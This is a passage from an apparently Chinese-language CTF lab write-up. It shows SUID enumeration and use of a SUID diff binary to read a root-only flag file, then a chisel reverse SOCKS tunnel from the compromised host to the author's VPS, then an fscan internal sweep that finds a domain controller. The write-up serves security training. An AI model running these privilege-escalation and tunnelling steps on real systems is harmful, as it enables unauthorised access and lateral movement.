2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点-suid-提权">入口点 Suid 提权<a href="#入口点-suid-提权" class="hash-link" aria-label="入口点 Suid 提权的直接链接" title="入口点 Suid 提权的直接链接">​</a></h2>
<p>对 suid 特权文件进行扫描</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/$ </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-perm</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-u</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">s </span><span class="token parameter variable" style="color:#36acaa">-type</span><span class="token plain"> f </span><span class="token operator file-descriptor important" style="color:#393A34">2</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">/dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/stapbpf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/gpasswd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chfn</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/su</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/chsh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/staprun</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/at</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/diff</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/fusermount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/sudo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/mount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/newgrp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/umount</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/passwd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/lib/openssh/ssh-keysign</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/lib/eject/dmcrypt-get-device</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>发现 <code>/usr/bin/diff</code> 结合 suid 可以实现任意文件读取</p>
<p>同时发现 flag 文件</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/$ </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-lh</span><span class="token plain"> /home/flag/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">total </span><span class="token number" style="color:#36acaa">4</span><span class="token plain">.0K</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-r-------- </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> root root </span><span class="token number" style="color:#36acaa">798</span><span class="token plain"> Jul </span><span class="token number" style="color:#36acaa">24</span><span class="token plain"> 08:14 flag01.txt</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>就可以直接借助 <code>/usr/bin/diff --line-format=%L /dev/null /home/flag/flag01.txt</code> 来对 <code>flag01.txt</code> 进行读取</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="flag---01">flag - 01<a href="#flag---01" class="hash-link" aria-label="flag - 01的直接链接" title="flag - 01的直接链接">​</a></h2>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> |  _&quot;\ \| ___&quot;|/ |&quot;|    \| ___&quot;|/U /&quot;___|uU  /&quot;\  u  |_ &quot;_|     ___     \/&quot;_ \/ | \ |&quot;|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/| | | | |  _|&quot;U | | u   |  _|&quot;  \| |  _ / \/ _ \/     | |      |_&quot;_|    | | | |&lt;|  \| |&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  |||_   &lt;&lt;&gt;&gt;  //  \\  &lt;&lt;   &gt;&gt;   _)(|_   \\    &gt;&gt;  _// \\_.-,_|___|_,-.  \\    ||   \\,-.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> (__)_) (__) (__)(_&quot;)(&quot;_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-&#x27;&#x27;-(_/  (__)   (_&quot;)  (_/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">flag01: flag{54bbe683-5e1d-4e18-96c3-724db360b28b}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Great job!!!!!!</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Here is the hint: WIN19\Adrian</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">I&#x27;ll do whatever I can to rock you...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点-建立中转枢纽">入口点 建立中转枢纽<a href="#入口点-建立中转枢纽" class="hash-link" aria-label="入口点 建立中转枢纽的直接链接" title="入口点 建立中转枢纽的直接链接">​</a></h2>
<p>借助 <code>pwncat-cs</code> 的文件上传能力，上传 <code>chisel_1.9.1_linux_amd64</code> 之后，建立代理隧道</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">vps 139.*.*.*</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root@jmt-projekt:~</span><span class="token comment" style="color:#999988;font-style:italic"># ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 08:45:56 server: Reverse tunnelling enabled</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 08:45:56 server: Fingerprint 2YUi1QXviZmFSEGJIEb3uN4KxK+uVWmTtTH0LIaylDo</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 08:45:56 server: Listening on http://0.0.0.0:1337</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">入口点 39.99.241.120</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/tmp$ ./chisel_1.9.1_linux_amd64 client </span><span class="token number" style="color:#36acaa">139</span><span class="token plain">.*.*.*:1337 R:0.0.0.0:10001:socks </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3352</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 08:46:44 client: Connecting to ws://139.*.*.*:1337</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 08:46:44 client: Connected </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Latency </span><span class="token number" style="color:#36acaa">43</span><span class="token plain">.547056ms</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>成功建立连接</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">vps 139.*.*.*</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token number" style="color:#36acaa">2024</span><span class="token plain">/07/24 08:46:44 server: session</span><span class="token comment" style="color:#999988;font-style:italic">#1: tun: proxy#R:10001=&gt;socks: Listening</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="入口点-内网信息搜集">入口点 内网信息搜集<a href="#入口点-内网信息搜集" class="hash-link" aria-label="入口点 内网信息搜集的直接链接" title="入口点 内网信息搜集的直接链接">​</a></h2>
<p>上传 <code>fscan</code> 进行内网扫描</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/tmp$ </span><span class="token function" style="color:#d73a49">ifconfig</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">eth0: </span><span class="token assign-left variable" style="color:#36acaa">flags</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">416</span><span class="token operator file-descriptor important" style="color:#393A34">3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">UP,BROADCAST,RUNNING,MULTICAST</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  mtu </span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36  netmask </span><span class="token number" style="color:#36acaa">255.255</span><span class="token plain">.0.0  broadcast </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.255.255</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet6 fe80::216:3eff:fe1b:be8a  prefixlen </span><span class="token number" style="color:#36acaa">64</span><span class="token plain">  scopeid 0x2</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">link</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ether 00:16:3e:1b:be:8a  txqueuelen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Ethernet</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX packets </span><span class="token number" style="color:#36acaa">89638</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">124109416</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">124.1</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  frame </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX packets </span><span class="token number" style="color:#36acaa">21827</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">7117035</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7.1</span><span class="token plain"> MB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  carrier </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  collisions </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lo: </span><span class="token assign-left variable" style="color:#36acaa">flags</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">7</span><span class="token operator file-descriptor important" style="color:#393A34">3</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">UP,LOOPBACK,RUNNING</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  mtu </span><span class="token number" style="color:#36acaa">65536</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1  netmask </span><span class="token number" style="color:#36acaa">255.0</span><span class="token plain">.0.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        inet6 ::1  prefixlen </span><span class="token number" style="color:#36acaa">128</span><span class="token plain">  scopeid 0x1</span><span class="token operator file-descriptor important" style="color:#393A34">0</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">host</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        loop  txqueuelen </span><span class="token number" style="color:#36acaa">1000</span><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Local Loopback</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX packets </span><span class="token number" style="color:#36acaa">678</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">59169</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">59.1</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        RX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  frame </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX packets </span><span class="token number" style="color:#36acaa">678</span><span class="token plain">  bytes </span><span class="token number" style="color:#36acaa">59169</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">59.1</span><span class="token plain"> KB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        TX errors </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  dropped </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> overruns </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  carrier </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  collisions </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">remote</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> www-data@localhost:/tmp$ ./fscan_amd64.1 </span><span class="token parameter variable" style="color:#36acaa">-h</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36/24</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start </span><span class="token function" style="color:#d73a49">ping</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7      is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19     is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36     is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">icmp</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> Target </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45     is alive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Icmp alive hosts len is: </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45:445 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19:445 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7:445 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45:139 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19:139 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7:139 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45:135 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7:135 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19:135 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.45:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36:80 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7:88 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36:3306 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36:22 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.36:21 </span><span class="token function" style="color:#d73a49">open</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> alive ports len is: </span><span class="token number" style="color:#36acaa">15</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">start vulscan</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> NetInfo:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">FILESERVER</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.19</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> NetInfo:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">DC01</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> NetBios: </span><span class="token number" style="color:#36acaa">172.22</span><span class="token plain">.4.7      </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">DC DC01.xiaorang.lab             Windows Server </span><span class="token number" style="color:#36acaa">2016</span><span class="token plain"> Datacenter </span><span class="token number" style="color:#36acaa">14393</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span 